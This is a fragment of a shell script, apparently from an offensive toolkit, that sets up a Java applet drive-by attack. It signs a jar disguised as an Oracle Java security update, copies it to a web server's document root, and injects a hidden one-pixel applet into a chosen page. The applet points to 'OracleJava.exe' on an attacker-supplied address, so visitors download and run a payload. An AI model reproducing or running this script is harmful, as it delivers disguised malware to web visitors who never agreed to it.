...
jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar oracle_java_security_update.jar JavaAppletATK.jar signapplet
printf "\033[1;33m[Info] Done.\033[0m\n"
echo
printf "\033[1;33m[Info] Moving files to /var/www/html...\033[0m\n"
cp JavaAppletATK.class oracle_java_security_update.jar /var/www/html
printf "\033[1;33m[Info] Done.\033[0m\n"
echo
...
read address
echo "<applet width="1" height="1" id="Java Secure" code="JavaAppletATK.class" archive="oracle_java_security_update.jar"><param name="1" value="http://$address/OracleJava.exe"></applet>" > /var/www/html/$htmlfiletoembed
